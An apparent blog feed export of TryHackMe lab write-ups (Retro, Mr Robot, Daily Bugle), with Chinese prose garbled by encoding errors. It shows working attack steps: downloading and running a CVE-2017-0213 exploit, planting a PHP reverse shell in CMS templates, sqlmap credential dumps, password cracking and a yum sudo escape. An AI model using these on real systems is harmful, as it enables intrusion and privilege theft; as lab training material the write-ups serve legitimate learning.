alt="image"></p><blockquote><p>Â¶ÇÊûúÂú®‰∏äÂõæÁïåÈù¢‰∏≠Êó†Ê≥ïÊâãÂä®ÈÄâÊã©‰ΩøÁî®ÊµèËßàÂô®‰ª•ÊâìÂºÄÈìæÊé•‚ÄìÂàôÈúÄË¶ÅÊàë‰ª¨ÈáçÊñ∞ÈÉ®ÁΩ≤‰∏Ä‰∏™ÁõÆÊ†áÊú∫Âô®Âπ∂Âú®ÈÄöËøáRDPËøêË°åÁõÆÊ†áÊú∫‰∏äÁöÑhhupd.exeÊñá‰ª∂‰πãÂâç ÂÖàÊâìÂºÄ‰∏Ä‰∏™IEÊµèËßàÂô®ÂÆû‰æã</p></blockquote><p>Âõ†‰∏∫ÁõÆÊ†áÊú∫Âô®Ê≤°ÊúâËøûÊé•Âà∞‰∫íËÅîÁΩëÔºåÊâÄ‰ª•Êàë‰ª¨Â∞ÜÂú®<code>Internet Explorer</code>ÊµèËßàÂô®‰∏≠ÁúãÂà∞‰ª•‰∏ãÁïåÈù¢ÔºàËøôÂπ∂‰∏çÂΩ±ÂìçÊºèÊ¥ûÂà©Áî®ËøáÁ®ãÔºâÔºåÊ≠§Â§ÑÂÖ∂ÂÆûÊòØ‰ª•Á≥ªÁªüÁ∫ßÂà´ÁöÑÊùÉÈôêÊù•ÊâìÂºÄÊµèËßàÂô®ÔºåÊàë‰ª¨ÁªßÁª≠Êåâ<code>Alt</code>ÈîÆÂºπÂá∫Á®ãÂ∫èËèúÂçïÊ†èÔºåÁÑ∂ÂêéÂçïÂáª&quot;Âè¶Â≠ò‰∏∫‚Ä¶&quot;</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150200066-2015236866.png" alt="image-20241012150152799"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150347911-676620041.png" alt="image-20241012150339873"></p><p>Âú®ÂºπÂá∫ÁöÑÁ™óÂè£‰∏≠ËæìÂÖ•<code>C:\Windows\System32\*.*</code>ÁÇπÂáªÂõûËΩ¶ÔºåÂÆö‰ΩçÂà∞<code>System32</code>ÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150458156-990693367.png" alt="image-20241012150451317"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150545579-666682287.png" alt="image-20241012150538624"></p><p>ÁÑ∂ÂêéÂú®‰∏äÈù¢ËæìÂÖ•<code>cmd.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150626890-48998100.png" alt="image-20241012150620038"></p><p>ËøôÈáåÊ≠£Â∏∏Êù•ËØ¥Â∫îËØ•ÊòØÂèØ‰ª•ÊèêÊùÉÊàêÂäüÁöÑÔºå‰ΩÜÊòØÊàëËøôÈáå‰∏çÁü•ÈÅìÊòØÂì™‰∏™Ê≠•È™§Âá∫Èîô‰∫ÜÔºåÂØºËá¥Ê≤°ÊúâÊèêÊùÉÊàêÂäü„ÄÇ„ÄÇ„ÄÇ</p><h2 id="Âà©Áî®ÂÜÖÊ†∏ÊºèÊ¥ûÊèêÊùÉ">Âà©Áî®ÂÜÖÊ†∏ÊºèÊ¥ûÊèêÊùÉ</h2><p>ÈÄöËøá<code>systeminfo</code>ËøõË°å‰ø°ÊÅØÊêúÈõÜ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012151549840-1471797610.png" alt="image-20241012151542920"></p><p>ÂèëÁé∞Âú®Ëøô‰∏™ÁâàÊú¨‰∏ãÊúâ <code>CVE-2017-0213</code>ÊºèÊ¥û</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip"> CVE-2017-0213ÊºèÊ¥ûÂà©Áî®</a></p><p>Âú®kaliÊú∫‰∏≠‰∏ãËΩΩ‰ª•‰∏ä zipÊñá‰ª∂Âπ∂ÈÄöËøá<code>unzip</code>ÂëΩ‰ª§Ëß£ÂéãÂæóÂà∞exeÔºåÁÑ∂Âêé‰º†ËæìËØ•exeÊñá‰ª∂Âà∞Èù∂Êú∫‰∏≠ÔºåÊúÄÂêéÈÄöËøáËøúÁ®ãÊ°åÈù¢Áõ¥Êé•ÊâßË°åËØ•exeÊñá‰ª∂Âç≥ÂèØÊàêÂäüÊèêÊùÉ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152613938-1409594014.png" alt="image-20241012152606663"></p><p>Ëµ∑‰∏Ä‰∏™pythonÊúçÂä°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152654989-441442532.png" alt="image-20241012152648189"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Âú®Èù∂Êú∫cmd‰∏≠‰ΩøÁî®PowershellÁöÑInvoke-WebRequestÊ®°Âùó</span></span><br><span class="line">Powershell <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">81</span>/CVE<span class="literal">-2017-0213_x64</span>.exe <span class="literal">-OutFile</span> exploit.exe</span><br><span class="line"></span><br><span class="line">.\exploit.exe</span><br><span class="line"><span class="comment">#ÊâßË°åÊºèÊ¥ûÂà©Áî®exe‰πãÂêéÔºåÊàë‰ª¨ËÉΩÁúãÂà∞ËØ•ÊºèÊ¥ûÂà©Áî®Á®ãÂ∫èÁîüÊàê‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑCMD shell‰∏îÊùÉÈôê‰∏∫Administrator‚Äî‚ÄîÊèêÊùÉÊàêÂäü„ÄÇ</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154001467-1487303658.png" alt="image-20241012153954000"></p><p>ÊèêÊùÉÊàêÂäüÔºåÊãøÂà∞<code>system</code>ÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154050259-1805537077.png" alt="image-20241012154043442"></p><p>Âú®<code>c:/Users/Administrator/Desktop</code>ÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãRetro</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://www.fomal.cc/tags/Windows/"/>
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Mr Robot CTF</title>
    <link href="https://www.fomal.cc/posts/9f5f1768.html"/>
    <id>https://www.fomal.cc/posts/9f5f1768.html</id>
    <published>2024-10-09T12:04:27.000Z</published>
    <updated>2024-10-27T12:34:01.519Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.202.26</p><p>ÊîªÂáªÊú∫ipÔºö 10.11.101.220</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.202.26</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009200958952-1307236102.png" alt="image-20241009200954547"></p><p>ÂèëÁé∞22Ôºå80Á≠âÁ´ØÂè£Ôºå‰ΩÜÊòØsshÊúçÂä°ÂÖ≥Èó≠‰∫Ü</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009201526558-368574539.png" alt="image-20241009201522229"></p><p>ÈªòËÆ§È°µÈù¢ÊòØ‰∏Ä‰∏™Á±ª‰ºº‰∫élinuxÁªàÁ´ØÁöÑÁïåÈù¢ÔºåÊ≠£Â∏∏ÁöÑÂëΩ‰ª§ÊâßË°å‰∏ç‰∫ÜÔºåÂè™ËÉΩÊâßË°åÈ°µÈù¢Êèê‰æõÁöÑÂëΩ‰ª§</p><p>ÊØè‰∏™ÂëΩ‰ª§ÈÉΩÊµãËØï‰∫Ü‰∏Ä‰∏ãÔºåÂπ∂Ê≤°Êúâ‰ªÄ‰πàÂ•πÁâπÂà´ÈáçË¶ÅÁöÑ‰ø°ÊÅØÔºåÂÖàÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.202.26/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203017797-1719379315.png" alt="image-20241009203013287"></p><p>ÁªìÊûúÂæàÂ§öÔºå‰ΩÜÊòØÂèØ‰ª•ÁúãÂá∫Êù•ËøôÊòØ‰∏Ä‰∏™<code>wordpress</code>ÁöÑÁ´ô</p><h1>ÂêéÂè∞getshell</h1><p>ÂÖàÊü•Áúã‰∏Ä‰∏ãÂìé<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203649868-7394202.png" alt="image-20241009203645784"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203728050-509535539.png" alt="image-20241009203724196"></p><p>ÊâæÂà∞Á¨¨‰∏Ä‰∏™<code>key</code></p><p>Âè¶‰∏Ä‰∏™Êñá‰ª∂<code>fsocity.dic</code>ËÆøÈóÆÂêéËá™Âä®‰∏ãËΩΩ‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204040584-1051975220.png" alt="image-20241009204036224"></p><p>ÊâìÂºÄÂêéÊòØ‰∏™Â≠óÂÖ∏</p><p>Êé•ÁùÄËÆøÈóÆÊâ´ÊèèÂá∫Êù•ÁöÑÁªìÊûúÊó∂ÔºåÂèëÁé∞Âú®<code>/license</code>Êñá‰ª∂‰∏ãÊúâ‰ø°ÊÅØ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204827064-1879933782.png" alt="image-20241009204822920"></p><p>ÂæàÂÉè<code>base64</code>ÁºñÁ†ÅÔºåËß£Á†ÅËØïËØï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205002306-1782867748.png" alt="image-20241009204958248"></p><p>ÂæóÂà∞‰∏Ä‰∏™Áî®Êà∑ÂêçÂØÜÁ†ÅÔºö<code>elliot:ER28-0652</code></p><p>Â∞ùËØïÁôªÈôÜ<code>wordpress</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205219208-88514281.png" alt="image-20241009205215191"></p><p>Ê≤°ÊÉ≥Âà∞ËøôÊòØ‰∏™admnÁî®Êà∑ÔºåËµöÁøªÂï¶</p><p>Áõ¥Êé•kaliÁõëÂê¨‰∏ÄÊâã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009210509904-1918358012.png" alt="image-20241009210505770"></p><p>Â∞ÜÂáÜÂ§áÂ•ΩÁöÑ<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>ÂÜôÂú®<code>404.php</code>‰∏ä</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212111435-983517017.png" alt="image-20241009212106883"></p><p>ËÆæÁΩÆÂ•ΩipÂíåportÂêé‰øùÂ≠ò</p><p>ÊµèËßàÂô®ËÆøÈóÆ<code>http://10.10.202.26/theme/twentyfifteen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212848299-908977679.png" alt="image-20241009212844443"></p><p>ÊãøÂà∞ÂàùÂßãÊùÉÈôê</p><h1>ÊèêÂçáËá≥userÊùÉÈôê</h1><p>ÂàáÊç¢‰∫§‰∫íÂºèshell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213103248-2017368856.png" alt="image-20241009213059186"></p><p><code>/home</code>‰∏ãÊúâ<code>robot</code>Áî®Êà∑ÔºåËøõÂÖ•‰πãÂêéÂèëÁé∞Á¨¨‰∫å‰∏™<code>key</code>Ôºå‰ΩÜÊòØÊàë‰ª¨Êü•Áúã‰∏ç‰∫ÜÔºåÊàë‰ª¨ËÉΩÊü•ÁúãÂè¶‰∏Ä‰∏™Êñá‰ª∂ÔºåÊ†πÊçÆÂÖ∂ÂÜÖÂÆπÂèØ‰ª•Âà§Êñ≠Âá∫ËøôÊòØ<code>robot</code>ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å</p><p>Â∞ÜÂØÜÁ†Å‰øùÂ≠òÂà∞Êñá‰ª∂<code>hash</code>‰∏≠ÔºåÁî®<code>hashcat</code>Á¶ªÁ∫øÁ†¥Ëß£ËØïËØï</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213509026-1986403223.png" alt="image-20241009213504820"></p><p>Á†¥Ëß£ÊàêÂäüÔºåÊãøÂà∞<code>robot</code>Áî®Êà∑ÁöÑÊòéÊñáÂØÜÁ†Å<code>abcdefghijklmnopqrstuvwxyz</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213616619-415158260.png" alt="image-20241009213612441"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213650967-1591154118.png" alt="image-20241009213647123"></p><p>ÊãøÂà∞Á¨¨‰∫å‰∏™<code>key</code></p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><p>ÂÖàÂ∞ùËØï<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214047420-696985946.png" alt="image-20241009214043116"></p><p>okÔºå‰∏çËÆ©Áî®</p><p>Áî®<code>find</code>Êü•‰∏Ä‰∏ãÁâπÊùÉÂëΩ‰ª§</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214115004-1182315555.png" alt="image-20241009214110829"></p><p>ÂèëÁé∞Êúâ<code>nmap</code>ÔºåÂèØ‰ª•Âà©Áî®<code>nmap</code>ÊèêÊùÉ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214602683-1592532035.png" alt="image-20241009214558352"></p><p>ÊèêÊùÉÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214644568-905281974.png" alt="image-20241009214640433"></p><p>Âú®<code>/root</code>ÁõÆÂΩï‰∏ãÊâæÂà∞ÊúÄÂêé‰∏Ä‰∏™<code>key</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãMr Robot CTF</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Daily Bugle</title>
    <link href="https://www.fomal.cc/posts/4b5f600a.html"/>
    <id>https://www.fomal.cc/posts/4b5f600a.html</id>
    <published>2024-10-08T05:23:31.000Z</published>
    <updated>2024-10-27T12:33:47.912Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.158.159</p><p>ÊîªÂáªÊú∫ipÔºö 10.11.101.220</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.158.159 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008133602854-1151410066.png" alt="image-20241008133559967"></p><p>ÂèëÁé∞Êúâ22Ôºå80Ôºå3306Á´ØÂè£ÂºÄÊîæÔºåÂπ∂‰∏îÂú®80Á´ØÂè£‰∏äÊúâ<code>robots.txt</code>ÔºåÂºÄÂêØ‰∫ÜmysqlÊúçÂä°</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135115833-1217847155.png" alt="image-20241008135112969"></p><p>È°µÈù¢Ë≤å‰ººÊ≤°‰ªÄ‰πà‰ø°ÊÅØÔºåÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.158.159/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135616416-1722312870.png" alt="image-20241008135614061"></p><p>ÂÖàÁúã‰∏ã<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135637011-1331873752.png" alt="image-20241008135634589"></p><p>Áªº‰∏äÊù•ÁúãËøôÊòØ‰∏Ä‰∏™<code>joomla CMS</code>ÔºåÁõÆÂΩïËÆøÈóÆÂêéÂπ∂Ê≤°ÊúâÂèëÁé∞‰ªÄ‰πà‰ø°ÊÅØ</p><h1>SQLÊºèÊ¥ûÂà©Áî®</h1><p>‰ΩøÁî®<code>joomscan</code>ÊµãËØï‰∏Ä‰∏ã</p><p><code>joomscan -u http://10.10.158.159/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141255235-581479402.png" alt="image-20241008141252485"></p><p>ÂèëÁé∞ÁâàÊú¨ÊòØ3.7.0ÔºåÊêúÁ¥¢‰∏Ä‰∏ãÊòØÂê¶ÊúâÂèØ‰ª•Âà©Áî®ÁöÑÊºèÊ¥û</p><p><code>searchsploit joomla 3.7.0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141440663-205205108.png" alt="image-20241008141438525"></p><p>ÂèëÁé∞Âú®ËØ•ÁâàÊú¨Â≠òÂú®sqlÊ≥®ÂÖ•ÔºåÂ∞ÜÊñá‰ª∂Â§çÂà∂‰∏ãÊù•Êü•Áúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141545963-1681767930.png" alt="image-20241008141543468"></p><p>ËøôÈáåÂÜô‰∫Ü‰ΩøÁî®<code>sqlmap</code>Â∑•ÂÖ∑ËøõË°åsqlÊ≥®ÂÖ•ÔºåÁõ¥Êé•ÁÖßÁùÄÂºÑÂ∞±Ë°å</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008143755357-1634909799.png" alt="image-20241008143752393"></p><p>Âà©Áî®ÊàêÂäüÔºåÂæóÂà∞Êï∞ÊçÆÂ∫ìÔºåÁªßÁª≠ÁàÜÁ†¥Ë°®</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144208470-98185412.png" alt="image-20241008144206265"></p><p>ÂæóÂà∞ÂæàÂ§öË°®ÔºåÊàë‰ª¨ÈáçÁÇπÁúã<code>users</code>Ë°®ÔºåÂÖàÊü•ÁúãÂ≠óÊÆµÁöÑÂÄº</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' --columns -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144831007-655266633.png" alt="image-20241008144828658"></p><p>ÈÄâÈ°πÁõ¥Êé•Ê≠£Â∏∏ÈÄâÂ∞±Ë°å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150239571-1068282498.png" alt="image-20241008150237274"></p><p>Êº´ÈïøÁ≠âÂæÖÂêé‰πüÊòØÊääÂ≠óÊÆµÁàÜÁ†¥Âá∫Êù•‰∫ÜÔºåÊàë‰ª¨ÈáçÁÇπÁúãÁî®Êà∑ÂêçÂíåÂØÜÁ†Å</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C username,password --dump -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150415433-886794507.png" alt="image-20241008150413037"></p><p>ÊàêÂäüÊãøÂà∞‰∫Ü‰∏ÄÁªÑÂá≠ÊçÆ</p><p><code>jonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></p><p>ÂØÜÁ†ÅÊòØÂä†ÂØÜÊï∞ÊçÆÔºåËøôÈáå‰ΩøÁî®<code>john</code>Á†¥Ëß£ÔºåÂÖàÂ∞ÜÂØÜÁ†Å‰øùÂ≠òËá≥<code>hash</code></p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152021738-1397311919.png" alt="image-20241008152018882"></p><p>ÂæóÂà∞<code>jonah</code>Áî®Êà∑ÁöÑÊòéÊñáÂØÜÁ†Å<code>spiderman123</code></p><p>ÁôªÂΩï<code>joomla</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152334179-1197770814.png" alt="image-20241008152331521"></p><p>ÁôªÈôÜÊàêÂäü</p><h1>Ëé∑ÂæóÂàùÂßãÊùÉÈôê</h1><p>Êü•ÁúãÂêéÂèëÁé∞ÂèØ‰ª•ÈÄöËøáÊîπÂÜôÊ®°ÊùøÊñá‰ª∂ÁöÑÂÜÖÂÆπgetshell</p><p>È¶ñÂÖàÁÇπÂáªÂè≥‰æß<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152509620-2024984243.png" alt="image-20241008152507304"></p><p>ÂÜçÁÇπÂáªÂè≥‰æßÁöÑ<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152709570-776349238.png" alt="image-20241008152706921"></p><p>ÈÄâÁ¨¨‰∏Ä‰∏™<code>Beez3</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152751934-1122413670.png" alt="image-20241008152749484"></p><p>‰∏∫‰∫ÜÊñπ‰æøÂèçÂºπshellÔºåÁõ¥Êé•‰øÆÊîπindex.phpÊñá‰ª∂</p><p>Â∞Ü<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>ÂÜôÂà∞Êñá‰ª∂‰∏≠ÔºåÂπ∂‰øÆÊîπÂÖ∂‰∏≠ÁöÑipÂíåport</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154536026-2069500358.png" alt="image-20241008154533386"></p><p>‰øùÂ≠òÔºåÂú®kali‰∏≠Ëµ∑‰∏™ÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008153222944-538312390.png" alt="image-20241008153220414"></p><p>Âú®È°µÈù¢‰∏≠ËÆøÈóÆÂàöÊâç‰øÆÊîπÁöÑÊñá‰ª∂</p><p><code>http://10.10.158.159/templates/beez3/index.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154616790-1766426576.png" alt="image-20241008154614259"></p><p>getshellÊàêÂäüÔºÅ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154837476-1061401653.png" alt="image-20241008154835273"></p><p>Áé∞Âú®Âè™Êúâ‰∏Ä‰∏™ÂàùÂßãËÆøÈóÆÊùÉÈôêÔºåËøòÈúÄË¶ÅÊ®™ÂêëÁßªÂä®Âà∞<code>jjameson</code>Áî®Êà∑</p><h1>ÊèêÂçáËá≥userÊùÉÈôê</h1><p>ÂÖàÊü•ÁúãÊñá‰ª∂</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241008160838389.png" alt="image-20241008160838389"></p><p>Âú®Êü•ÁúãÊñá‰ª∂ÁöÑÊó∂ÂÄôÂèëÁé∞Âú® <code>/var/www/html</code>ÁõÆÂΩï‰∏ãÊúâ‰∏™<code>configuration.php</code>Êñá‰ª∂ÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161000178-1468348786.png" alt="image-20241008160957808"></p><p>ÂèëÁé∞ÊúâÂØÜÁ†Å<code>nv5uz9r3ZEDzVjNu</code>ÔºåË≤å‰ººÊòØrootÁî®Êà∑ÁöÑÔºåsshÁôªÂΩï‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161333840-1625929510.png" alt="image-20241008161331426"></p><p>ÁúãÊ†∑Â≠ê‰∏çÊòØrootÁöÑÂØÜÁ†ÅÔºåÂ∞ùËØïsshÁôªÈôÜ<code>jjameson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161255917-2029099622.png" alt="image-20241008161253699"></p><p>ÁôªÈôÜÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161356936-1355687411.png" alt="image-20241008161354772"></p><p>Áõ¥Êé•Âú®ÂΩìÂâçÈ°µÈù¢ÊâæÂà∞<code>user.txt</code></p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><p>ÂÖàÊâßË°å<code>sudo -l</code>ÁúãÁúãÊòØÂê¶ÊúâÂèØÂà©Áî®ÁöÑ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161550666-1278824895.png" alt="image-20241008161548452"></p><p>ÂèØ‰ª•‰ΩøÁî®<code>yum</code>ÊèêÊùÉ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/x&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">plugins=1</span></span><br><span class="line"><span class="string">pluginpath=$TF</span></span><br><span class="line"><span class="string">pluginconfpath=$TF</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.conf&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.py&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import yum</span></span><br><span class="line"><span class="string">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span></span><br><span class="line"><span class="string">requires_api_version=&#x27;2.1&#x27;</span></span><br><span class="line"><span class="string">def init_hook(conduit):</span></span><br><span class="line"><span class="string">  os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">sudo yum -c <span class="variable">$TF</span>/x --enableplugin=y</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161921642-247827710.png" alt="image-20241008161919145"></p><p>ÊèêÊùÉÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008162019148-1120378338.png" alt="image-20241008162016902"></p><p>Âú®<code>/root</code>ÁõÆÂΩï‰∏ãÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãDaily Bugle</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Boiler CTF</title>
    <link href="https://www.fomal.cc/posts/39dcc2b4.html"/>
    <id>https://www.fomal.cc/posts/39dcc2b4.html</id>
    <published>2024-10-07T07:17:47.000Z</published>
    <updated>2024-10-27T12:33:17.332Z</updated>
    
